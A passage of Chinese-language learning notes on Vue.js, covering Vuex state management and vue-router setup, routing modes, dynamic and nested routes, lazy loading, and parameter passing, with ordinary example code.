管理什么状态呢？\n\n比如：用户的登录状态、用户名称、头像等\n\n比如：商品的收藏、购物车中的物品等\n\n这些状态信息，我们都可以放在统一的地方，对它进行保存和管理，而且他们还是响应式的\n\n\n\n### 1.3 单页面的状态管理\n\n<img src='https://s1.328888.xyz/2022/04/09/XaTeC.png' style=\"zoom:67%;\" >\n\nState：状态—data中的属性\n\nView：视图层，可以针对State的变化，显示不同的信息—模板\n\nActions：用户的各种操作，会导致状态的改变—方法\n\n\n\n### 1.4 多界面状态管理\n\nVuex–全局单例模式 （大管家）—Vuex背后的思想\n\n+ 将共享的状态抽取出来，交给大管家，统一管理\n+ 每个视图，按照规定好的规定，进行访问和修改等操作\n\n\n\n### 1.5 Vuex状态管理图例\n\n<img src='https://s1.328888.xyz/2022/04/09/XacDg.png' style=\"zoom:50%;\" >\n\nDevtools ：记录每一次status修改的状态，所以官方网站推荐改vuex时，在这里改\n\n如果绕过mutations，就没法跟踪修改的状态\n\n> mutations 同步操作，所以只有同步操作时可以绕过actions\n>\n> actions 异步操作时 如网络请求\n\nbackend：后端\n\n\n\n### 1.6 安装devtools插件\n\n在f12中 的更多 如果又看到vue 就安装成功\n\n## 2. Vuex的使用\n\n### 2.1 Vuex的下载\n\n~~~js\nnpm install vuex --save @3.0.1\n~~~\n\n\n\n### 2.2 Vuex使用\n\n1. 把Vuex插件导入\n\n   ~~~js\n   //main.js\n   \n   import Vuex from 'vuex'\n   \n   //1.安装插件\n   Vue.use(Vuex)\n   \n   //2.创建实例\n   \n   ~~~\n\n   一般不在main中写，重建文件夹，store，创建index.js\n\n   > 导入模块   安装插件 创建store对象 导出对象   在main挂载Vue.prototype.$store = store\n   >\n   > 在state保存状态\n   >\n   > 在mutations写方法 修改state\n   \n   ~~~js\n   import Vue from 'vue'\n   import Vuex from 'vuex'\n   \n   //1.安装插件\n   Vue.use(Vuex)   //底层会执行这个插件的方法 ： Vuex.install\n   \n   //2.创建对象\n   const store = new Vuex.Store({\n       state:{\n           counter:1000\n       },     //保存状态\n       mutations: {\n           //方法\n           increment(state) {\n               state.counter++;\n           },\n           decrement(state) {\n               state.counter--;\n           }\n       },\n       actions:{},\n       getters:{},\n       modules:{}\n   })\n   \n   //3.导出store对象\n   export default store\n   \n   //在main.js挂载\n   import stroe from './stroe'\n   \n   //这样才会 多个组件使用它\n   Vue.prototype.$store = store\n   \n   ~~~\n   \n   在其他页面使用counter \n   \n   > 使用state的状态 $store.state.counter\n   >\n   > 使用里面的方法 $store.commit(“方法名”)\n   \n   ~~~vue\n   //app.vue\n   <template>\n   \t<h2>------app内容：直接compontens 修改 state -------</h2>\n   \t<h2>{{$store.state.counter}}</h2>\n   \t<button @click='$store.state.counter++'>+</button>\n   \n   \t<h2>--------vuex内容：使用nutations--------</h2>\n   \t<button @click='sub'>-</button>\n   \n   </template>\n   <script>\n   import HelloVuex from \"./components/HelloVuex\";\n   export default {\n   \tname: \"App\",\n   \tcomponents: {\n   \t\tHelloVuex,\n   \t},\n   \tdata() {\n   \t\treturn {\n   \t\t\tmessage: \"我是app组件\",\n   \t\t\t// counter: 0,\n   \t\t};\n   \t},\n   \tmethods: {\n   \t\tadd() {\n   \t\t\treturn this.$store.commit(\"increment\");\n   \t\t},\n   \t\tsub() {\n   \t\t\treturn this.$store.commit(\"decrement\");\n   \t\t},\n   \t},\n   };\n   </script>\n   ~~~\n   \n   <img src='https://s1.328888.xyz/2022/04/09/Xamw1.jpg' style=\"zoom: 50%;\" >\n\n\n\n## 3.Vuex核心概念（p133 2021/05/01)\n\n### 3.1 State 单一状态树 \n\n> 相当于data\n\n一个项目就一个store\n\n### 3.2 Getters\n\n> 相当于computed\n\n与计算属性相似，如果要发生什么变化再给其他组件使用\n\n1. 如果要对数据产生什么变化，就直接在getters变化后，去使用就可以了\n\n   + 在getters定义计算属性\n\n     ~~~js\n     getters(){\n         powCounter(state){\n             return state.counter * state.counter;\n         }\n     }\n     ~~~\n\n   + 在app的template使用计算属性  因为是计算属性 所以可以不用加括号\n\n     ~~~vue\n     <template>\n     \t<h3>原来的方法：{{$store.state.counter * $store.state.counter}}</h3>\n     \t<h3>使用getters:{{$store.getters.powCounter}}</h3>\n     </template>\n     ~~~\n\n   \n\n2.  如果要使用对象中的某一个筛选对象，例如学生中选年龄大于12岁的,加学生个数，传入年龄 选出年龄大的学生\n\n   + ~~~js\n     // index.js \n     state: {\n             //保存状态\n             counter: 1000,\n             students: [\n                 { id: 111, name: 'why1', age: 11 },\n                 { id: 112, name: 'why2', age: 12 },\n                 { id: 113, name: 'why3', age: 13 },\n                 { id: 114, name: 'why4', age: 14 },\n             ]\n         },\n     ~~~\n\n   + > 使用计算属性\n     >\n     > ~~~vue\n     > <template>\n     > \t<h3>{{more12stu}}</h3>\n     > </template>\n     > <script>\n     > computed: {\n     > \t\t more12stu() {\n     > \t\t \treturn this.$store.state.students.filter((s) => s.age > 12);\n     > \t\t },\n     > \t},\n     > </script>\n     > ~~~\n     >\n     > 要是别的页面要用就得复制过去，很麻烦\n\n   + 使用getters\n\n     ~~~js\n     //index.js \n     getters: {\n             //大于12的学生\n             more12stu(state) {\n                 return state.students.filter(s => s.age > 12)\n             },\n             //大于12的学生的个数\n             more12stuLength(state,getters) {\n                 return getters.more12stu.length;\n             },\n             //大于age的学生\n             moreAgestu(state){\n                 return age => state.students.filter(s => s.age > age)\n             }\n         },\n     ~~~\n\n     \n\n   + 使用getters的数据\n\n     ~~~js\n     //vue\n     <h3>年龄大于20的学生：{{ $store.getters.more12stu }}</h3>\n     \n     //大于12的学生的个数 可以直接 写length\n     <h3>{{ $store.getters.more12stu.length }}</h3>\n     //也可以再写一个计算属性\n     <h3>{{ $store.getters.more12stuLength }}</h3>\n     \n     //年龄大于age的学生\n     <h3>{{ $store.getters.moreAgestu(11) }}</h3>\n     ~~~\n\n     \n\n### 3.3 Mutation\n\n> 相当于methods\n\n+ vuex的store状态的更新唯一方式：commit mutation\n\n+ mutation包括两个部分：\n\n  + 字符串的事件类型type `increment`\n  + 一个回调函数handler，该回调函数的第一个参数是state`(state){state.couter--}`\n\n+ mutation的定义方式：\n\n  ~~~js\n  //index.js\n  mutatuions:{\n      increment(state){\n          state,counter--\n      }\n  }\n  ~~~\n\n+ mutation的更新：\n\n  ~~~js\n  //vue\n  add:function(){\n      this.$store.commit('increment')\n  }\n  ~~~\n\n#### 3.3.2 传入参数\n\n**参数被称为mutation的载荷Payload**\n\n点击＋任意数量   添加学生\n\n+ ~~~vue\n  //vue\n  <button @click='addcount(5)'>+5</button>\n  <button @click=\"addstu\">添加学生</button>\n  ~~~\n\n+ 写方法\n\n  ~~~js\n  //vue\n  methods:{\n      addcount(count){\n          return this.$store.commit('incrementcount',count);\n      },\n      addstu() {\n  \t    const stu = { id: 115, name: \"why5\", age: 15 };\n  \t\treturn this.$store.commit(\"addstu\", stu);\n  \t},\n  }\n  ~~~\n\n+ mutation\n\n  ~~~js\n  //index.js\n  mutations:{\n      incrementcount(state,count){\n          state.counter += count;\n      },\n      addstu(state, stu) {\n          state.students.push(stu)\n      }\n  }\n  ~~~\n\n\n\n#### 3.3.3 mutation的提交风格\n\n~~~js\n//vue methods\naddcount(count) {\n\t//1. 普通提交方式\n\t return this.$store.commit(\"incrementcount\", count);\n    \n\t//2.特殊的封装方式\n\treturn this.$store.commit({\n\t\ttype: \"incrementcount\",\n\t\tcount,\n\t});\n},\n~~~\n\n~~~js\n//index.js mutation \nincrementcount(state, count) {\n       console.log(count);\n       // 如果是普通提交 返回的是 count的数值\n       // 如果是封装的提交 返回的是整个参数对象  \n       // 这里就应该使用 payload参数命名 然后使用layload.count\n       state.counter += count\n},\n==>\nincrementcount(state,layload){\n    state.counter += layload.count;\n}\n~~~\n\n\n\n#### 3.3.4 vuex数据响应式原理(对组件也是一个道理)\n\n<img src='https://s1.328888.xyz/2022/04/09/XawBt.jpg' style=\"zoom:50%;\" >\n\n在里面的定义的每个属性 都会有一个Dep[watcher…]  watcher会监听每一个页面的属性变化\n\n\n\n##### 3.3.4.1在mutations增加删除数据事如何做到响应式\n\n~~~js\nmutations:{\n    updateInfo(state){\n        //这样无法响应式 就是代码改了 无法在页面改 因为没有监听\n        state.info['address'] = 'china';\n        //使用Vue.set方法就可以\n        Vue.set(state.info , 'address' , 'china');\n        \n        //删除数据时 使用delete删除无法响应式\n        delete state.info.age;\n        //使用Vue.delete可以\n        Vue.delete(state.info , 'age');\n    }\n}\n~~~\n\n\n\n#### 3.3.5 mutation常量类型\n\n把vue里面methods里面commit括号里的”increment“，和index.js里mutations里的increment变成一个常量，这样不会写错\n\n1. 在store文件夹下面 新建 `mutations.types.js` 用来导出常量\n\n   ~~~js\n   //mutations.types.js\n   export const INCREMENT = \"increment\"\n   ~~~\n\n2. 导入文件，修改vue里的”increment“\n\n   ~~~js\n   import { INCREMENT } from \"../store/mutations.types\";\n   add() {\n   \treturn this.$store.commit(INCREMENT);\n   },\n   ~~~\n\n3. 导入文件，修改index.js的increment\n\n   ~~~js\n   import { INCREMENT } from './mutations.types'\n   [INCREMENT](state) {\n               state.counter++;\n   },\n   ~~~\n\n### 3.4 Action\n\n> 相当于异步methods\n\n在mutations中进行异步操作，devtools插件没有办法追踪到变化，页面变化，但是控制台的代码没有变\n\n所以用actions替代mutations\n\n~~~js\n//index.js\nmutations:{\n    updateInfo(state){\n        return state.info.name = 'why';\n    }\n}\nactions:{\n    //context:上下文  可看成state 不能跳过mutations\n    //传参数\n    aUpdateInfo(context,payload){\n        setTimeOut(() => {\n            context.commit('updateInfo',payload); \n            console.log(paylog);\n        },1000)\n    }\n}\n~~~\n\n在vue中操作\n\n~~~js\n<button @click=\"updateInfo\">更新</button>\n\nupdateInfo(){\n    //this.$store.commit('updateInfo');  //不会改代码\n    this.$store.dispatch('aUpdateInfo','我是payload');  //这样才会经过actions mutations 然后被插件检测到\n}\n~~~\n\n\n\n**在修改成功的时候通知用户**\n\n一般在commit的地方就修改成功了\n\n+ 正常写法：\n\n  ~~~js\n  //vue\n  updateInfo(){\n      //this.$store.dispatch('aUpdateInfo',()=>{\n      //    console.log(\"修改成功\");\n      //})\n      return this.$store.dispatch('aUpdateInfo',{\n          message:\"我是携带信息\",\n          success:()=>{\n          console.log(\"修改成功\");\n      }\n      })\n  }\n  ~~~\n\n  ~~~js\n  //index.js\n  actions:{\n      aUpdateInfo(context,payload){\n          setTimeout(() => {\n              context.commit('updateInfo');  //一般在这会修改成功\n              //payload()\n              console.log(layload.message);\n              payload.success();\n          },1000)\n      }\n  }\n  ~~~\n\n+ 优雅的写法 使用promise\n\n  ~~~js\n  //vue\n  updateInfo(){\n      return this.$store\n      .dispatch(\"aUpdateInfo\")\n      .then(res => {\n          console.log(res)\n      })\n  }\n  ~~~\n\n  ~~~js\n  //index.js\n  aUpdateInfo(context,payload){\n      return new Promise((resolve,reject) => {\n          setTimeout(() => {\n              context.commit('updateInfo');\n              console.log(payload);\n              resolve(111);\n          })\n      })\n  }\n  ~~~\n\n### 3.5 Module\n\n+ 因为vue使用单一状态树意味着很多状态都给vuex来管理\n+ 当应该很复杂时store就很臃肿\n+ 所以vuex允许我们将store分割城模块，每个模块拥有自己的state、mutations、actions、getters\n\n~~~js\n//index.js\nconst moduleA = {\n    state: {\n        name: \"lisi\"\n    },\n    mutations: {\n        updatelisi(state.payload){\n            state.name=payload;\n        }\n    },\n    actions: {\n        aupdatelisi(context) {\n            //这里commit的是上面部分的mutations\n            console.log(context);//有根的各种东西\n            setTimeout(() => {\n                context.commit('updatelisi', 'wangwu');\n            }, 1000)\n        }\n    },\n    getters: {\n        fullname(state) {\n            return state.name + ' getters'\n        },\n        fullname(state, getters ,rootState){\n            //rootState 根的state\n            return getters.fullname + rootState.counter;\n        }\n    }\n}\nconst store = new Vuex.Store({\n    ...\n    modules: {\n        a: moduleA\n    }\n})\n//vue使用\n<h3 style=\"color: red\">{{ $store.state.a.name }}</h3>\n<h3 style=\"color: red\">{{ $store.getters.fullname }}</h3>\n<h3 style=\"color: red\">{{ $store.getters.fullname2 }}</h3>\n<button @click=\"change\">改名</button>\n<button @click=\"asyncChange\">异步改名</button>\n\nmethods:{\n    change(){\n        this.$store.commit('updatelisi',\"张三\");\n    },\n\tasyncChange() {\n\t\tthis.$store.dispatch(\"aupdatelisi\");\n\t},\n}\n~~~\n\n\n\n### 3.6 actions的写法 对象的解构\n\n~~~js\nactions:{\n    add(context){\n        ...\n    },\n    //也可以写成\n    add({state,commit,rootState}){\n       ...\n    }\n}\n~~~\n\n\n\n解构：\n\n~~~js\nconst obj = {\n    name:'11',\n    age:18,\n    height:1.88,\n}\n\nconst {age , name} = obj;\n~~~\n\n\n\n## 4.store文件夹的目录组织\n\n把mutations、actions、getters全部抽出文件 导入到`index.js`\n\n建modules文件夹，放moduleA.js …文件 导入`index.js`\n\nstate一般不抽\n\n\n\n\n\n\n\n","tags":["vue"],"categories":["learningNotes"]},{"title":"06 vue-router","url":"/learningNotes/vue/06 vue-route","content":"\n\n[toc]\n\n# (2021/03/23-29 p100-118)\n\n## 1.认识路由\n\n### 1.1 路由\n\n路由：通过互联的网络把信息从源地址传输到目的地的活动\n\n路由器提供了两种机制：路由和转送\n\n​     路由是决定数据包从来源到目的地的路径\n\n​     转送将输入端的数据转移到合适的输出端\n\n路由表：本质上就是一个映射表，决定了数据包的指向\n\n### 1.2 前端渲染 后端渲染(p101)\n\n后端渲染：jsp：Java serve page\n\n后端路由：后端处理url和页面之间的映射关系\n\n前后端分离：ajax\n\nSPA单页面富应用：在前后端分离的基础上加了一层前端路由\n\n前端路由的核心：改变url，但页面不进行整体刷新\n\n### 1.3 url的hash和HTML5的history\n\n如何实现改变url，不刷新页面\n\n#### 1.3.1 URL的hash\n\nurl的hash也就是锚点（#），本质上是改变window.location的herf属性\n\n可以通过直接赋值location.hash来改变href，但是页面不发生刷新\n\n<img src=\"https://s1.328888.xyz/2022/04/09/XapI2.png\" alt=\"image-20210323202246058\" style=\"zoom:67%;\" />\n\n#### 1.3.2 HTML5的history\n\n+ `history.pushState({},'','home')`\n\n  > `history.back()`可以回退  左箭头也能回退\n\n+ `history.replaceState({},'','home')`\n\n  > 不能回退\n\n+ `history.go() `\n\n  > `history.go(-1) == history.back()`\n  >\n  > 正数前进 负数后退\n\n+ `history.forward()`\n\n  > `history.forward() == history.go(1) `\n\n## 2.vue-router基本使用\n\n### 2.1 认识vue-router\n\n目前前端流行的三大框架，都有自己的路由实现：\n\n+ Angular的ngRouter\n+ React的ReactRouter\n+ Vue的vue-router\n\nvue-router是Vue.js官方的路由插件，和vue.js是深度集成的，适合用于构建单页面应用\n\n官网：https://router.vuejs.org/zh/\n\nvue-router是基于路由和组件的\n\n+ 路由用于设定访问路径，将路径和组件映射起来\n+ 在vue-router的单页面应用中，页面的路径的改变就是组件的切换\n\n\n\n### 2.2 安装和使用vue-router\n\n#### 2.2.1安装\n\n步骤一：安装\n\n`npm install vue-router --save`\n\n步骤二：在模块化工程中使用它（因为是一个插件，所以可以通过Vue.use()来安装路由功能）\n\n1. **导入**路由对象，并且**调用Vue.use(VueRouter)**\n2. 创建**路由实例**，并且传入路由**映射配置**\n3. 在**Vue实例**中**挂载**创建的**路由实例**\n\n~~~js\n//router/index.js 搭建路由的框架\n\n//配置路由相关的信息\nimport Vue from 'vue'\nimport Router from 'vue-router'\n\n//1.通过Vue.use(插件),安装插件\nVue.use(Router)\n\n//2.创建VueRouter对象\n\nconst routes = [{\n\n}]\n\nconst router = new Router({\n    //配置路由和组件之间的应用关系\n    routes\n})\n\n//3.将其传入vue实例中\nexport default router\n\n~~~\n\n~~~js\n//main.js\n\nimport Vue from 'vue'\nimport App from './App'\n//router文件夹 会自动导入index\nimport router from './router'\n\nVue.config.productionTip = false\n\n/* eslint-disable no-new */\nnew Vue({\n    el: '#app',\n    router,\n    //将路由传入vue实例\n    render: h => h(App)\n})\n~~~\n\n#### 2.2.2使用(p104-110)\n\n##### 1.使用步骤\n\n使用vue-router的步骤：\n\n1. 创建路由组件\n\n2. 配置路由映射，组件和路径映射的关系\n\n3. 使用路由：通过`<router-link>`和`<router-view>`\n\n   > `<router-link>`该标签是一个vue-router中已经内置的组件，会被渲染成一个`<a>`标签\n\n   > `<router-view>`\t该标签会根据当前路径，动态渲染出不同的组件\n\n   > 网页的其他内容，比如顶部的标题/导航，等会和`<router-view>`处于同一个等级\n\n   > 在路由切换时，切换的是`<router-view>`挂载的组件，其他内容不会发生改变\n\n~~~vue\n//创建新的组件\n//Home.vue\n\n<template>\n\t<div>\n\t\t<h2>我是首页</h2>\n\t</div>\n</template>\n\n<script>\nexport default {\n\tname: \"Home\",\n};\n</script>\n\n<style>\n</style>\n\n//About.vue\n<template>\n\t<div>\n\t\t<h2>我是关于</h2>\n\t</div>\n</template>\n\n<script>\nexport default {\n\tname: \"About\",\n};\n</script>\n\n<style>\n</style>\n~~~\n\n~~~js\n//配置映射  index.js\n\n//配置路由相关的信息\nimport Vue from 'vue'\nimport Router from 'vue-router'\n\n//导入组件\nimport Home from '../components/Home.vue'\nimport About from '../components/About.vue'\n\n//1.通过Vue.use(插件),安装插件\nVue.use(Router)\n\n//2.创建VueRouter对象\nconst routes = [{\n    path: '/home',\n    component: Home\n}, {\n    path: '/about',\n    component: About\n}]\n\nconst router = new Router({\n    //配置路由和组件之间的应用关系\n    routes\n})\n\n\n//3.将其传入vue实例中\nexport default router\n~~~\n\n~~~vue\n//要把组件写到App.vue才能渲染出来\n\n<template>\n\t<div id=\"app\">\n\t\t<!-- router-link 与a标签类似  会将a标签渲染在页面上 -->\n\t\t<router-link to=\"/home\">首页</router-link>\n\t\t<router-link to=\"/about\">关于</router-link>\n\t\t<!-- 决定组件展示在页面的位置 -->\n\t\t<router-view></router-view>\n\t</div>\n</template>\n\n<script>\nexport default {\n\tname: \"App\",\n};\n</script>\n\n<style>\n</style>\n~~~\n\n<img src='https://s1.328888.xyz/2022/04/09/Xa0jM.png'>\n\n##### 2.路由的默认路径：\n\n~~~js\n//index.js\nconst routes = [{\n    path: '/',   //  ‘/’ 加不加都可以\n    redirect: '/home'\n}, {\n    path: '/home',\n    component: Home\n}, {\n    path: '/about',\n    component: About\n}]\n~~~\n\n> 在routes中又配置了一个映射，\n>\n> path配置的是根路径:/\n>\n> redirect是重定向，也就是将根路径重定向到/home的路径下，这样就可以打开就默认是home了\n\n##### 3.修改url的展示模式\n\n> 因为默认是hash展示 会有# 没那么好看\n>\n> 把mode改成history 就可以没有#\n\n~~~js\n//index.js\n\nconst router = new Router({\n    //配置路由和组件之间的应用关系\n    routes,\n    mode: 'history'\n})\n~~~\n\n##### 4.router-link补充\n\n属性：\n\n1. **to**：用于指定跳转的路径\n\n2. **tag**：指定渲染成什么组件\n\n   > 例`<router-link tag='li'></router-link>`渲染成`<li></li>`\n\n3. **replace**：不会留下history记录\n\n   >  例`<router-link replace></router-link>`\n\n4. **active-class**：当`<router-link>`对应的路由匹配成功时，会自动给当前元素设置一个` router-link-active`的`class`，设置`active-class`可以修改默认的名称\n\n   > 例`<router-link active-class='active'></router-link>`\n\n   > 如果很多要改的话 可以在\n   >\n   > ~~~js\n   > //index.js\n   > const router = new Router({\n   >     //配置路由和组件之间的应用关系\n   >     routes,\n   >     mode: 'history', //改变url的展示方式\n   >     linkActiveClass: 'active'  //修改默认的点击赋给的类名\n   > })\n   > ~~~\n\n##### 5.不使用router-link，使用代码修改路径\n\n~~~vue\n//App.vue\n<template>\n\t<div id=\"app\">\n\t\t<h2>我是app组件</h2>\n\t\t<!-- router-link 与a标签类似  相当于将a标签渲染在页面上 -->\n\t\t<!-- <router-link to=\"/home\">首页</router-link>\n\t\t<router-link to=\"/about\">关于</router-link> -->\n        <!-- 1.用标签直接写  加上触发指定方法 -->\n\t\t<button @click=\"homeClick\">首页</button>\n\t\t<button @click=\"aboutClick\">关于</button>\n\n\t\t<!-- 决定组件展示在页面的位置 -->\n\t\t<router-view></router-view>\n\t</div>\n</template>\n\n<script>\nexport default {\n\tname: \"App\",\n    //2.定义方法\n\tmethods: {\n\t\thomeClick() {\n\t\t\t//3.通过代码的方式修改路由  vue-router\n\t\t\t//push == pushState  可以返回\n\t\t\t// this.$router.push(\"/home\");\n\t\t\tthis.$router.replace(\"/home\");\n\t\t}, \n\t\taboutClick() {\n\t\t\tthis.$router.push(\"/about\");\n\t\t},\n\t},\n};\n</script>\n\n<style>\n</style>\n\n~~~\n\n##### 6.动态路由的使用(p108)\n\n+ 某些情况下，一个页面的path路径可能是不确定的，比如进入用户页面的时候，希望是\n  + /user/aaaa  或者 /user/bbbb\n  + 除了有前面的/user 外 ，后面还跟上了用户ID\n  + 这种path和Component的匹配关系，称之为动态路由==》也是路由传递数据的一种方式\n\n+ 步骤：\n\n  1. **添加组件User.vue 添加路由映射** \n\n     > ~~~js\n     > //不使用到动态路由的话\n     > {\n     >     path:'/user',\n     >     component:User\n     > }\n     > \n     > //使用动态路由\n     > {\n     >     path:'/user/:id',\n     >     component:User\n     > }\n     > ~~~\n\n  2. **在User.vue组件中使用动态路由传递的数据**\n\n     > ~~~vue\n     > <template>\n     > <div>\n     >     //id 与上面 :后面的名称一样\n     >     <h2>{{ $router.params.id }}</h2>\n     >     \n     >     //或者使用组件下面获取的数据\n     >     <h2>{{ userId }}</h2>\n     > </div>\n     > </template>\n     > \n     > <script>\n     > export default {\n     > \tname: \"User\",\n     > \tcomputed: {\n     > \t\tuserId() {\n     > \t\t\treturn this.$route.params.userId;\n     > \t\t},\n     > \t},\n     > };\n     > </script>\n     > ~~~\n\n  3. **在展示的组件 App.vue添加 此信息**\n\n     > ~~~vue\n     > <template>\n     > \t<div id=\"app\">\n     >         //直接添加  没有动态获取的id\n     >         <router-link to=\"/user/zhangsan\">用户</router-link>\n     >         \n     >         //需要获取下面动态数据 v-bind\n     > \t\t<router-link :to=\"'/user/' + userId\">用户</router-link>\n     > \t</div>\n     > </template>\n     > \n     > <script>\n     > export default {\n     > \tname: \"App\",\n     > \tdata() {\n     > \t\treturn {\n     > \t\t\tuserId: \"lisi\",\n     > \t\t};\n     > \t},\n     > }\n     > </script>\n     > ~~~\n\n**$router : new出来的路由对象**\n\n**$route : 处于活跃的路由**\n\n~~~vue\n//User.vue\n<template>\n\t<div>\n\t\t<h2>我是用户界面</h2>\n\t\t<p>我是用户相关信息</p>\n\t</div>\n</template>\n\n<script>\nexport default {\n\tname: \"User\",\n};\n</script>\n\n<style>\n</style>\n~~~\n\n~~~js\n//index.js\n//1.导入 +\nimport User from '../components/User.vue'\n\n//2.创建VueRouter对象 +\nconst routes = [{\n    //放在第一个 是好习惯 而非固定要求\n    path: '/',\n    redirect: '/home'\n}, {\n    path: '/home',\n    component: Home\n}, {\n    path: '/about',\n    component: About\n}, {\n    path: '/user',\n    component: User\n}]\n\n~~~\n\n> 但是不能起到拼接userid的作用\n\n~~~js\n//index.js\n {\n    path: '/user/:userId',  //只改这里 不会渲染user\n    component: User\n}\n\n//App.vue\n//没有动态\n<router-link to=\"/user/zhangsan\">用户</router-link>  \n//在跳转的时候 添加/zhangsan\n\n//动态获取 属性动态添加 下面的data\n<router-link :to=\"'/user/' + userId\">用户</router-link>\n\nexport default {\n\tname: \"App\",\n\tdata() {\n\t\treturn {\n\t\t\tuserId: \"lisi\",\n\t\t};\n\t},\n}\n~~~\n\n将用户id获取到 然后在User.vue使用\n\n~~~vue\n//User.vue\n<template>\n\t<div>\n\t\t<h2>我是用户界面</h2>\n\t\t<p>我是用户相关信息</p>\n\t\t<h2>{{ userId }}</h2>   //!!!!\n        <h2>{{ $route.params.userId }}</h2>\n\t</div>\n</template>\n\n<script>\nexport default {\n\tname: \"User\",\n\tcomputed: {\n\t\tuserId() {\n\t\t\t//$route 拿到的是活跃的router\n\t\t\t//param：参数  userId : path: '/user/:userId' 的\n\t\t\treturn this.$route.params.userId; //!!!\n\t\t},\n\t},\n};\n</script>\n\n<style>\n</style>\n~~~\n\n##### 7.路由懒加载(p109-110)\n\n###### 7. 1vue-router打包文件的解析\n\n> dist > static > index.html + css + js >app… + manifest… + vendor… \n\n在打包的时候 会自动把css文件 跟js文件分开放，不会像之前一样都放在一个js文件里\n\n而js文件也有分不同的包\n\n+ app : 当前应用程序开发的所有代码 （业务代码）\n+ manifest：为打包的代码做底层（底层导入，导出 或者更复杂的操作）支撑\n+ vendor：（提供商，第三方：vue/vue-router/axios/bs）第三方的东西\n\n###### 7.2 认识路由懒加载\n\n+ 官方解释：\n\n当打包构建应用时，JavaScript包会很大，影响页面加载\n\n如果能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应的组件，这样比较高效\n\n+ 路由懒加载做的东西：\n  + 主要作用：将路由对应的组件打包成一个个的js代码块\n  + 只有在这个路由被访问到的时候，才加载对应的组件\n\n###### 7.3 懒加载的方式\n\n1. 结合Vue的异步组件和Webpack的代码分析（能认识就好）\n\n   > ~~~js\n   > const Home = resolve => { require.ensure(['../components/Home.vue'],() => { resolve(require('../components/Home.vue')) })}\n   > ~~~\n\n2. AMD写法：\n\n   > ~~~js\n   > const About = resolve => require(['../components/About.vue'],resolve);\n   > ~~~\n\n3. 在Es6中，我们可以有更加简单的写法来组织Vue异步组件和Webpack的代码分割(常用)\n\n   > ~~~js\n   > //代替导入操作  推荐使用\n   > const Home = () => import('../components/Home.vue');\n   > \n   > //也可以在路由那里直接使用\n   > {\n   >     path:'/home',\n   >     component:() => import('../components/Home')\n   > }\n   > ~~~\n\n这个时候在npm run build 打包的时候 就会发现 js文件夹下 多了3个js文件 \n\n一个懒加载 一个js文件\n\n## 3.vue-router嵌套路由\n\n### 3.1 认识嵌套路由\n\n+ 比如在home页面中，希望通过/home/news 和 /home/message访问一些内容\n\n+ 一个路径映射一个组件，访问这两个路径也会分别渲染两个组件\n\n+ 路径和组件的关系：\n\n  ><img src='https://s1.328888.xyz/2022/04/09/Xa7J7.jpg' style=\"zoom:50%;\" >\n\n+ 实现嵌套路由的步骤：\n\n  1. 创建对应的子组件，并且在路由映射中配置对应的子路由\n  2. 在组件内部使用`<router-view>`标签\n\n### 3.2 路由的嵌套使用\n\n1. 新建两个HomeNews.vue  HomeMessage.vue 组件\n\n2. 在index.js 配置上述两个vue的映射关系\n\n   > ~~~js\n   > //index.js\n   > const routes = [\n   >     {\n   >     path: '/home',\n   >     component: Home,\n   >     children: [{\n   >         path: 'news', //不用加 ‘/’  会自动给加上：'/home/news'\n   >         component: HomeNews\n   >     }, {\n   >         path: 'message',\n   >         component: HomeMessage\n   >     }]\n   > }\n   > ]\n   > ~~~\n\n3. 子路由的显示\n\n   > ~~~vue\n   > //因为这些vue是显示在home页面的 所以在Home.vue页面中 添加`<router-view>`\n   > <template>\n   > \t<div>\n   > \t\t<h2>我是首页</h2>\n   > \t\t<!-- 要写完成路径 -->\n   > \t\t<router-link to=\"/home/news\">新闻</router-link>\n   > \t\t<router-link to=\"/home/message\">消息</router-link>\n   > \t\t<router-view></router-view>\n   > \t</div>\n   > </template>  \n   > ~~~\n\n4. 默认显示新闻路径 配置映射\n\n   > ~~~js\n   > //index.js\n   > children: [{\n   >         path: '',\n   >         redirect: 'news'\n   >     }, {\n   >         path: 'news', //不用加 ‘/’  会自动给加上：'/home/news'\n   >         component: HomeNews\n   >     }, {\n   >         path: 'message',\n   >         component: HomeMessage\n   >     }]\n   > ~~~\n\n## 4.vue-router参数传递\n\n### 4.1 传递参数的方式：params和query\n\n+ params类型：只传一个简单的参数\n  + 配置路由格式：`/router/:id`\n  + 传递的方式：在path后面跟上对应的值`:to=\"'/user/' + userId\"`\n  + 传递后形成的路径：`/router/123`、`/router/abc`\n+ query类型：\n  + 配置路由格式：`/router` ，也就是普通配置\n  + 传递的方式：对象中使用query的key作为传递方式\n  + 传递后形成的路径：`/router?id=123`、`/router?id=abc`\n\n### 4.2 query类型的使用\n\n1. 创建新的组件 Profile.vue\n\n2. 配置路由映射 index.js\n\n   > 1. 导入：`const Profile = () => import ('../components/Profile.vue');`\n   > 2. 配置映射：`{ path: '/profile', component: Profile }`\n\n3. 添加跳转的`<router-link>` app.vue\n\n   > `<router-link to=\"/profile\">我的</router-link>`\n\n4. 将参数传递到url\n\n   > ~~~js\n   > //index.js\n   > //若想把{} 当成对象 就得加 v-bind 这样才能被当成语法去解析\n   > <router-link :to=\"{path:'/profile',query:{name:'why',age:18,height1'1.88}}\">我的</router-link>\n   > \n   > //此时点击页面的'我的' 地址显示为  localhost:8080/profile?name=why&age=18&height=1.88\n   > ~~~\n\n5. 去参数渲染到页面上\n\n   > ~~~vue\n   > //Profile.vue\n   > <template>\n   > \t<div>\n   > \t\t<h2>我是档案（我的）标题</h2>\n   > \t\t<h2>{{ $route.query.name }}</h2>\n   > \t</div>\n   > </template>\n   > ~~~\n\n### 4.3 当不使用router-link而使用普通的标签 传递参数\n\n~~~vue\n//App.vue  单纯想要 跳转页面时\n<template>\n\t<div id=\"app\">\n\t\t<button @click=\"userClick\">用户</button>\n\t\t<button @click=\"profileClick\">我的</button>\n\t\t<router-view></router-view>\n\t</div>\n</template>\n<script>\nexport default {\n\tname: \"App\",\n\tdata() {\n\t\treturn {\n\t\t\tuserId: \"lisi\",\n\t\t};\n\t},\n\tmethods: {\n\t\tuserClick() {\n            //单纯想要 跳转页面时\n\t\t\tthis.$router.push(\"/user/\" + this.userId);\n\t\t},\n\t\tprofileClick() {\n            //想要传递数据时\n\t\t\tthis.$router.push({\n                path:'/profile',\n                query:{\n                    name:'kobe',\n                    age:18,\n                    height:1.88\n                }\n            });\n\t\t},\n\t},\n};\n</script>\n~~~\n\n### 4.4 vue-router ： router route 的由来(p111)\n\n`$router`和`$route`是有区别的：\n\n+ 